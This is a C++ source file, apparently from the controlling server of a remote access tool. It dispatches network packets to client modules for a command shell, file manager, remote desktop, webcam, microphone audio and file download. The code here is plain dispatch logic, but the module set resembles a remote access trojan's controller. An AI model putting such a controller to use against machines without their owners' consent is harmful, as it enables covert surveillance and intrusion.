#include "stdafx.h"
#include "Manager.h"
#include"IOCPServer.h"
#include "Packet.h"
#include "EventHandler.h"
#include "ClientContext.h"

#include "KernelSrv.h"
#include "MiniFileTransSrv.h"
#include "MiniDownloadSrv.h"
#include "CmdSrv.h"
#include "ChatSrv.h"
#include "FileManagerSrv.h"
#include "FileMgrSearchSrv.h"
#include "RemoteDesktopSrv.h"
#include "CameraSrv.h"
#include "AudioSrv.h"

#include "MainFrm.h"
CManager::CManager(CIOCPServer*pServer)
{
	m_pServer = pServer;
}

CManager::~CManager()
{
}

//HandlerInit And HandlerTerm will be called in UI Thread.
BOOL CManager::HandlerInit(CClientContext*pClientContext, DWORD Identity)
{
	if (!pClientContext)
		return FALSE;
	CEventHandler*pHandler = NULL;
	CMainFrame*pMainFrame = NULL;
	/**************************Create Handler*********************************/
	switch (Identity)
	{
	case KNEL:
		pMainFrame = (CMainFrame*)AfxGetApp()->m_pMainWnd;
		pHandler = new CKernelSrv(pMainFrame->m_ClientList.GetSafeHwnd(), Identity);
		break;
	case MINIFILETRANS:
		pHandler = new CMiniFileTransSrv(Identity);
		break;

	case MINIDOWNLOAD:
		pHandler = new CMiniDownloadSrv(Identity);
		break;
	case CMD:
		pHandler = new CCmdSrv(Identity);
		break;
	case CHAT:
		pHandler = new CChatSrv(Identity);
		break;
	case FILE_MANAGER:
		pHandler = new CFileManagerSrv(Identity);
		break;
	case FILEMGR_SEARCH:
		pHandler = new CFileMgrSearchSrv(Identity);
		break;
	case REMOTEDESKTOP:
		pHandler = new CRemoteDesktopSrv(Identity);
		break;
	case CAMERA:
		pHandler = new CCameraSrv(Identity);
		break;
	case AUDIO:
		pHandler = new CAudioSrv(Identity);
		break;
	}
	/**************************************************************************/
	if (!pHandler)
		return FALSE;
	pClientContext->BindHandler(pHandler);
	pHandler->OnConnect();
	return TRUE;
}
BOOL CManager::HandlerTerm(CClientContext*pClientContext, DWORD Identity)
{
	if (!pClientContext)
		return FALSE;
	if (!pClientContext->m_pHandler)
		return FALSE;
	CEventHandler*pHandler = pClientContext->m_pHandler;

	pHandler->OnClose();
	pClientContext->UnbindHandler();
	/**************************Release Handler*********************************/
	switch (Identity)
	{
	case KNEL:
		delete (CKernelSrv*)pHandler;
		break;
	case MINIFILETRANS:
		delete (CMiniFileTransSrv*)pHandler;
		break;

	case MINIDOWNLOAD:
		delete (CMiniDownloadSrv*)pHandler;
		break;
	case CMD:
		delete (CCmdSrv*)pHandler;
		break;
	case CHAT:
		delete (CChatSrv*)pHandler;
		break;
	case FILE_MANAGER:
		delete (CFileManagerSrv*)pHandler;
		break;
	case FILEMGR_SEARCH:
		delete (CFileMgrSearchSrv*)pHandler;
		break;
	case REMOTEDESKTOP:
		delete (CRemoteDesktopSrv*)pHandler;
		break;
	case CAMERA:
		delete (CCameraSrv*)pHandler;
		break;
	case AUDIO:
		delete (CAudioSrv*)pHandler;
		break;
	default:
		break;
	}
	/**************************************************************************/
	return TRUE;
}

void CManager::ProcessCompletedPacket(int type, CClientContext*pContext, CPacket*pPacket)
{
	WORD Event = 0;
	DWORD dwTotal = 0;
	DWORD dwRead = 0;
	DWORD dwWrite = 0;
	HRESULT hResult = 0;
	switch (type)
	{
	case PACKET_ACCEPT_ABORT:
#ifdef DEBUG
		MessageBox(NULL, L"ACCEPT_ABORT", L"Warning", IDOK);
#endif
		break;
	case PACKET_CLIENT_CONNECT:
		if (!SendMessage(m_pServer->m_hNotifyWnd, WM_SOCKET_CONNECT, (WPARAM)pContext, pContext->m_Identity))
			pContext->Disconnect();
		break;
	case PACKET_CLIENT_DISCONNECT:
		SendMessage(m_pServer->m_hNotifyWnd, WM_SOCKET_CLOSE, (WPARAM)pContext, pContext->m_Identity);
		break;
	case PACKET_READ_COMPLETED:
		if (pPacket->GetCommand() != HEART_BEAT)
		{
			Event = GetCommandEvent(pPacket->GetCommand());
			dwTotal = pPacket->GetBodyLen();
			dwRead = pContext->m_dwRead - PACKET_HEADER_LEN;
			pContext->m_pHandler->OnReadComplete(Event, dwTotal, dwRead,pPacket->GetBody());
		}
		else
		{
			pContext->SendPacket(HEART_BEAT, 0, 0);
		}
		break;
	case PACKET_READ_PARTIAL:
		if (pPacket->GetCommand() != HEART_BEAT)
		{
			Event = GetCommandEvent(pPacket->GetCommand());
			dwTotal = pPacket->GetBodyLen();
			dwRead = pContext->m_dwRead - PACKET_HEADER_LEN;
			pContext->m_pHandler->OnReadPartial(Event, dwTotal, dwRead, pPacket->GetBody());
		}
		break;
	case PACKET_WRITE_COMPLETED:
		Event = GetCommandEvent(pPacket->GetCommand());
		dwTotal = pPacket->GetBodyLen();
		dwWrite = pContext->m_dwWrite - PACKET_HEADER_LEN;
		pContext->m_pHandler->OnWriteComplete(Event, dwTotal, dwWrite, pPacket->GetBody());
		break;
	case PACKET_WRITE_PARTIAL:
		Event = GetCommandEvent(pPacket->GetCommand());
		dwTotal = pPacket->GetBodyLen();
		dwWrite = pContext->m_dwWrite - PACKET_HEADER_LEN;
		pContext->m_pHandler->OnWritePartial(Event, dwTotal, dwWrite, pPacket->GetBody());
		break;
	}
}